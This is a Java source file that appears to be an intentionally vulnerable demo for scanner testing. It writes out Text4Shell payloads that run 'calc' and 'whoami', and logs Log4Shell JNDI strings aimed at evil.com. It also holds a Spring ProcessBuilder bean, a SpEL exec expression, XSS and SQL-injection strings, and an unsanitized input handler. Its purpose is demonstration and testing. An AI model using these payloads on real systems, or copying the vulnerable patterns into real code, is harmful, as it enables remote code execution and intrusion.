package com.example;

import org.apache.commons.lang3.StringEscapeUtils;
import org.apache.commons.text.StrSubstitutor;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.util.HashMap;
import java.util.Map;

/**
 * Demonstration of vulnerable string manipulation code
 * 
 * This class intentionally uses dependencies with known vulnerabilities:
 * - CVE-2022-42889: Apache Commons Text RCE vulnerability
 * - CVE-2017-12626: Jackson deserialization vulnerability  
 * - CVE-2021-44228: Log4Shell vulnerability in Log4j
 * - CVE-2016-1000027: Spring Framework RCE vulnerability
 */
public class VulnerableStringDemo {
    
    private static final Logger logger = LogManager.getLogger(VulnerableStringDemo.class);
    private static final ObjectMapper objectMapper = new ObjectMapper();
    
    public static void main(String[] args) {
        System.out.println("=== Vulnerable String Manipulation Demo ===");
        System.out.println("WARNING: This code contains known security vulnerabilities!");
        System.out.println();
        
        // Demonstrate CVE-2022-42889: Apache Commons Text RCE
        demonstrateCommonsTextVulnerability();
        
        // Demonstrate CVE-2017-12626: Jackson deserialization vulnerability
        demonstrateJacksonVulnerability();
        
        // Demonstrate CVE-2021-44228: Log4Shell vulnerability
        demonstrateLog4jVulnerability();
        
        // Demonstrate CVE-2016-1000027: Spring Framework RCE
        demonstrateSpringVulnerability();
        
        // Demonstrate Apache Commons Lang vulnerabilities
        demonstrateCommonsLangVulnerability();
    }
    
    /**
     * CVE-2022-42889: Apache Commons Text RCE vulnerability
     * The StringSubstitutor can execute arbitrary code through variable substitution
     */
    private static void demonstrateCommonsTextVulnerability() {
        System.out.println("=== CVE-2022-42889: Apache Commons Text RCE ===");
        
        // This is the vulnerable pattern that can lead to RCE
        String template = "${script:javascript:java.lang.Runtime.getRuntime().exec('calc')}";
        
        try {
            // This would execute arbitrary code if the input is not sanitized
            StrSubstitutor substitutor = new StrSubstitutor();
            String result = substitutor.replace(template);
            System.out.println("String substitution result: " + result);
        } catch (Exception e) {
            System.out.println("String substitution failed (expected): " + e.getMessage());
        }
        
        // More realistic vulnerable usage
        Map<String, String> values = new HashMap<>();
        values.put("user", "${script:javascript:java.lang.Runtime.getRuntime().exec('whoami')}");
        
        String userTemplate = "Hello ${user}!";
        StrSubstitutor userSubstitutor = new StrSubstitutor(values);
        String userResult = userSubstitutor.replace(userTemplate);
        System.out.println("User greeting: " + userResult);
        
        System.out.println();
    }
    
    /**
     * CVE-2017-12626: Jackson deserialization vulnerability
     * Deserializing untrusted data can lead to RCE
     */
    private static void demonstrateJacksonVulnerability() {
        System.out.println("=== CVE-2017-12626: Jackson Deserialization RCE ===");
        
        // This is a vulnerable pattern - deserializing untrusted JSON
        String maliciousJson = "{\"@class\":\"java.util.HashMap\",\"@type\":\"java.util.HashMap\"}";
        
        try {
            // This could deserialize malicious objects if not properly configured
            Object result = objectMapper.readValue(maliciousJson, Object.class);
            System.out.println("Deserialized object: " + result);
        } catch (Exception e) {
            System.out.println("Deserialization failed (expected): " + e.getMessage());
        }
        
        // Vulnerable string manipulation with Jackson
        String jsonString = "{\"name\":\"${jndi:ldap://evil.com/exploit}\"}";
        System.out.println("Processing JSON string: " + jsonString);
        
        System.out.println();
    }
    
    /**
     * CVE-2021-44228: Log4Shell vulnerability
     * Logging user input without sanitization can lead to RCE
     */
    private static void demonstrateLog4jVulnerability() {
        System.out.println("=== CVE-2021-44228: Log4Shell RCE ===");
        
        // This is the vulnerable pattern - logging unsanitized user input
        String userInput = "${jndi:ldap://evil.com/exploit}";
        
        // This would trigger the Log4Shell vulnerability
        logger.info("User input: " + userInput);
        
        // Another vulnerable pattern
        String searchQuery = "${jndi:rmi://evil.com/exploit}";
        logger.warn("Search query: " + searchQuery);
        
        // Vulnerable string manipulation
        String message = "Processing request: " + userInput;
        logger.error(message);
        
        System.out.println("Log4Shell vulnerability demonstrated (check logs)");
        System.out.println();
    }
    
    /**
     * CVE-2016-1000027: Spring Framework RCE vulnerability
     * Using vulnerable Spring versions with XML configuration
     */
    private static void demonstrateSpringVulnerability() {
        System.out.println("=== CVE-2016-1000027: Spring Framework RCE ===");
        
        try {
            // This could load malicious XML configuration
            String xmlConfig = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<beans xmlns=\"http://www.springframework.org/schema/beans\">" +
                "<bean class=\"java.lang.ProcessBuilder\">" +
                "<constructor-arg><list><value>calc</value></list></constructor-arg>" +
                "</bean></beans>";
            
            System.out.println("Spring XML configuration: " + xmlConfig);
            
            // Vulnerable string processing
            String springExpression = "#{T(java.lang.Runtime).getRuntime().exec('calc')}";
            System.out.println("Spring Expression: " + springExpression);
            
        } catch (Exception e) {
            System.out.println("Spring vulnerability demonstration: " + e.getMessage());
        }
        
        System.out.println();
    }
    
    /**
     * Apache Commons Lang vulnerabilities
     * Using deprecated and vulnerable string manipulation methods
     */
    private static void demonstrateCommonsLangVulnerability() {
        System.out.println("=== Apache Commons Lang Vulnerabilities ===");
        
        // Using deprecated StringEscapeUtils (vulnerable to XSS)
        String userInput = "<script>alert('XSS')</script>";
        String escaped = StringEscapeUtils.escapeHtml4(userInput);
        System.out.println("Escaped HTML: " + escaped);
        
        // Vulnerable string processing
        String sqlInput = "'; DROP TABLE users; --";
        String sqlEscaped = StringEscapeUtils.escapeHtml4(sqlInput);
        System.out.println("SQL escaped: " + sqlEscaped);
        
        // Another vulnerable pattern
        String xmlInput = "<?xml version=\"1.0\"?><root><data>${jndi:ldap://evil.com}</data></root>";
        System.out.println("XML processing: " + xmlInput);
        
        System.out.println();
    }
    
    /**
     * Demonstrates vulnerable string concatenation and processing
     */
    public static String processUserInput(String input) {
        // This method is vulnerable to various injection attacks
        if (input == null) {
            return "null";
        }
        
        // Vulnerable string manipulation
        String processed = "Processed: " + input;
        
        // Logging without sanitization (Log4Shell)
        logger.info("Processing input: " + input);
        
        // JSON processing without validation
        try {
            String json = "{\"input\":\"" + input + "\"}";
            Object result = objectMapper.readValue(json, Object.class);
            return result.toString();
        } catch (Exception e) {
            return "Error processing: " + e.getMessage();
        }
    }
}
